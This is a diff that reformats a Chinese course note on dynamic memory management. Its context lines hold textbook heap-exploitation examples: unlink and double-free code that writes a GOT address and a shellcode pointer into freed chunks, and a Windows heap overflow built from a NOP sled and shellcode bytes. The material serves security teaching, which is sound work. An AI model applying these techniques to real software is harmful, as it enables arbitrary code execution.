@@ -1,44 +1,35 @@
----
-tags:
-  - 软件安全
-comments: true
----
 # 动态内存管理
 ## 动态内存管理函数
 
-=== "C标准"
+### C标准
 
-	=== "`malloc`"
-		* `malloc(size_t size)`：分配给定大小内存，返回一个指向该内存的指针。
-			- 此内存没有被初始化！
+* `malloc(size_t size)`：分配给定大小内存，返回一个指向该内存的指针。 
+    - 内存没有被初始化！
 
-	=== "`realloc`"
-		* `realloc(void *p, size_t size)`：把p所指向的内存块大小调整为size个字节
-			- size=0 等价于`free(p)`
-			- p是空指针 等价于`malloc(size)`
-			- 新分配的内存未做初始化
+* `realloc(void *p, size_t size)`：把p所指向的内存块大小调整为size个字节
+    - size=0 等价于`free(p)`
+	- “p是空指针”等价于`malloc(size)`
+	- 新分配的内存未做初始化
 
-	=== "`calloc`"
-		* `calloc(size_t nmemb, size_t size)`：为数组分配内存，该数组共有`nmemb`个元素，每个元素的大小为`size`个字节
-			- 所分配的内存的内容全部设为0
+* `calloc(size_t nmemb, size_t size)`：为数组分配内存，该数组共有`nmemb`个元素，每个元素的大小为`size`个字节
+	- 所分配的内存的内容全部设为0
 
-	=== "`free`"
-		* `free(void *p)`释放
-			- 重复调用`free(p)`会导致未定义行为
-			- 如果p是空指针，则不执行任何操作
+* `free(void *p)`释放
+	- 重复调用`free(p)`会导致未定义行为
+	- 如果p是空指针，则不执行任何操作
 
-=== "C++标准"
-	`new` 和 `delete`
+### C++标准
+`new` 和 `delete`
 
 ## 内存管理器
 * [分配算法](../408-helper/operating-system/memory.md#连续分配管理方式)
-	1. 连续匹配（匹配的第一个）
-	2. 最先匹配（从内存开始位置寻找第一个空闲区域）
-	3. 最佳匹配
+	- 连续匹配（匹配的第一个）
+	- 最先匹配（从内存开始位置寻找第一个空闲区域）
+	- 最佳匹配
 		- 有m个字节的区域被选中，其中m是（或其中一个）可用的最小的等于或大于n个字节的连续存储的块
-	4. 最优匹配（选择遇到的第一个比样本更合适的块——最优结婚策略[^1]）
-	5. 最差匹配（匹配最大的空闲块）
-	6. 伙伴系统
+	- 最优匹配（选择遇到的第一个比样本更合适的块——最优结婚策略[^1]）
+	- 最差匹配（匹配最大的空闲块）
+	- 伙伴系统
 		* 只以2的幂数次大小为单位分配空间，方便合并和拆分
 * 内存管理器都做些什么
 	- 返回已释放的块到池中
@@ -63,7 +54,7 @@ comments: true
 
       for (i = 0; i < n; i++)
     	for (j = 0; j < n; j++)
-    		y[i] += A[i][j] * x[j];  // (1)
+    		y[i] += A[i][j] * x[j];  // (1)!
       return y;
     }
     ```
@@ -125,10 +116,10 @@ comments: true
 
     ```c
 	for (p = head; p != NULL; p = p->next)
-		free(p);    // (1)
+		free(p);    // (1)!
 	for (p = head; p != NULL; p = q) {
 		q = p->next;
-		free(p);   // (2)
+		free(p);   // (2)!
 	}
 	```
 
@@ -180,7 +171,7 @@ comments: true
 	  struct malloc_chunk* fd;
 	  struct malloc_chunk* bk;
 
-	  struct malloc_chunk* fd_nextsize; /* (1) */
+	  struct malloc_chunk* fd_nextsize; /* (1)! */
 	  struct malloc_chunk* bk_nextsize;
 
 	};
@@ -228,10 +219,10 @@ comments: true
 		first = malloc(666);
 		second = malloc(12);
 		third = malloc(12);
-		strcpy(first, argv[1]); // (1)
-		free(first);            // (2)
-		free(second);           // (3)
-								// (4)
+		strcpy(first, argv[1]); // (1)!
+		free(first);            // (2)!
+		free(second);           // (3)!
+								// (4)!
 		free(third);
 		return 0;
 	}
@@ -292,11 +283,11 @@ comments: true
 			fifth = malloc(1508);
 			sixth = malloc(12);
 			strcpy(first, argv[2]);
-			free(fifth);	                //(1)
-			strcpy(fourth, argv[1]);	    //(2)
-			free(second);	                //(3)
-			return(0);                      //(4)
-			                                //(5)
+			free(fifth);	                //(1)!
+			strcpy(fourth, argv[1]);	    //(2)!
+			free(second);	                //(3)!
+			return(0);                      //(4)!
+			                                //(5)!
 		}
 		```
 
@@ -347,20 +338,20 @@ comments: true
 				void *fifth, *sixth, *seventh;
 				shellcode_location = (void *)malloc(size);
 				strcpy(shellcode_location, shellcode);
-				first = (void *)malloc(256);                //(1)
+				first = (void *)malloc(256);                //(1)!
 				second = (void *)malloc(256);
 				third = (void *)malloc(256);
-				fourth = (void *)malloc(256);               //(2)
-				free(first);                                //(3)
-				free(third);                                //(4)
-				fifth = (void *)malloc(128);                //(5)
-				free(first);                                //(6)
-				sixth = (void *)malloc(256);                //(7)
-				*((void **)(sixth+0))=(void *)(GOT_LOCATION-12);  //(8)
+				fourth = (void *)malloc(256);               //(2)!
+				free(first);                                //(3)!
+				free(third);                                //(4)!
+				fifth = (void *)malloc(128);                //(5)!
+				free(first);                                //(6)!
+				sixth = (void *)malloc(256);                //(7)!
+				*((void **)(sixth+0))=(void *)(GOT_LOCATION-12);  //(8)!
 				*((void **)(sixth+4))=(void *)shellcode_location;
-				seventh = (void *)malloc(256);              //(9)
-				strcpy(fifth, "something");                 //(10)
-															//(11)
+				seventh = (void *)malloc(256);              //(9)!
+				strcpy(fifth, "something");                 //(10)!
+															//(11)!
 				return 0;
 			}
 			```
@@ -438,15 +429,15 @@ comments: true
 	    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
 		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128);
 	    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
-	    HeapFree(hp,0,h2); // (1)
-	    memcpy(h1, malArg, 32); 	// (2)
-	    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128); // (3)
+	    HeapFree(hp,0,h2); // (1)!
+	    memcpy(h1, malArg, 32); 	// (2)!
+	    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128); // (3)!
 		// (4)!
 		return;
 	}
 	int _tmain(int argc, _TCHAR* argv[]) {
 		mem();
-		return 0;    // (5)
+		return 0;    // (5)!
 	}
 	```
 
@@ -462,10 +453,10 @@ comments: true
 	int mem(char *buf) {
 		HLOCAL h1 = 0, h2 = 0;
 		HANDLE hp;
-		hp = HeapCreate(0, 0x1000, 0x10000);	// (1)
+		hp = HeapCreate(0, 0x1000, 0x10000);	// (1)!
 		if (!hp) return -1;
-		h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260); // (2)
-		strcpy((char *)h1, buf); // (3)
+		h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260); // (2)!
+		strcpy((char *)h1, buf); // (3)!
 		// (4)!
 		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260);
 		printf("we never get here");
@@ -487,11 +478,11 @@ comments: true
 		systemAddr = GetAddress("msvcrt.dll","system");
 		for (i = 0; i < 66; i++) strcat(buffer, "DDDD");
 		strcat(buffer, "\xeb\x14");
-		strcat(buffer, "\x44\x44\x44\x44\x44\x44"); // (6)
-		strcat(buffer, "\x73\x68\x68\x08"); // (7)
+		strcat(buffer, "\x44\x44\x44\x44\x44\x44"); // (6)!
+		strcat(buffer, "\x73\x68\x68\x08"); // (7)!
 		strcat(buffer, "\x4c\x04\x5d\x7c");
 		for (i = 0; i < 21; i++) strcat(buffer,"\x90");
-		strcat(buffer, "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"); // (8)
+		strcat(buffer, "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"); // (8)!
 		fixupaddresses(tmp, systemAddr);
 		strcat(buffer,tmp);
 		strcat(buffer,"\xFF\xD1\x90\x90");
@@ -509,12 +500,12 @@ comments: true
     8. 后向指针则被将要被覆写的内存地址所取代
 
 	```asm title="将要利用的异常管理器的汇编语句"
-	; (1)
+	; (1)!
 	mov  ecx, dword ptr [esp+4]
 	mov  eax, dword ptr ds:[7C5D044Ch]
 	mov  dword ptr ds:[7C5D044Ch], ecx
 	ret  4
-	; (2)
+	; (2)!
 	```
 
     1. `SetUnhandledExceptionFilter(myTopLevelFilter)`
@@ -534,12 +525,12 @@ comments: true
 	    HLOCAL h2 = 0;
 	    HANDLE hp;
 	    hp = HeapCreate(0, 0x1000, 0x10000);
-	    h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);     //(1)
-	    HeapFree(hp, 0, h1);                                    //(2)
-	    h1->fp = (PVOID)(0x042B17C - 4);                        //(3)
+	    h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);     //(1)!
+	    HeapFree(hp, 0, h1);                                    //(2)!
+	    h1->fp = (PVOID)(0x042B17C - 4);                        //(3)!
 	    h1->bp = shellcode;
- 	    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);               //(4)
-	    HeapFree(hp, 0, h2);                                    //(5)
+ 	    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);               //(4)!
+	    HeapFree(hp, 0, h2);                                    //(5)!
         return 0;
 	}
 	```
